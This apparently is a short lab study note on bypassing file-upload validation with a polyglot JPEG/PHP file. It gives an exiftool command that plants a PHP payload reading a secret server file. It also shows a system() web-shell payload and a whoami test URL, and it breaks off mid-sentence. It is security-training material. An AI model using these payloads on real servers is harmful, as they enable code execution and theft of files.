[[File Upload]]
Secure servers verify that a file's actual content (like image dimensions) matches its expected format rather than just trusting the declared Content-Type. For example, JPEG files always begin with the bytes **FF D8 FF**

This is a much more robust way of validating the file type, but even this isn't foolproof. Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

## Steps to create a polyglot file
> Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata. A simple way of doing this is to download and run ExifTool from the command line as follows:
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <INPUT-IMAGE>.jpg -o polyglot.php
```

> Upload the image on the website and verify if payload can be activated using
https://website.com?cmd=whoami
Use the message editor's search feature to find the `START` string somewhere within the binary image data in the response. Between this and the `END` string, you should

Obs:
Changing the payload to the below did not work
<?php echo system($_GET['command']); ?>
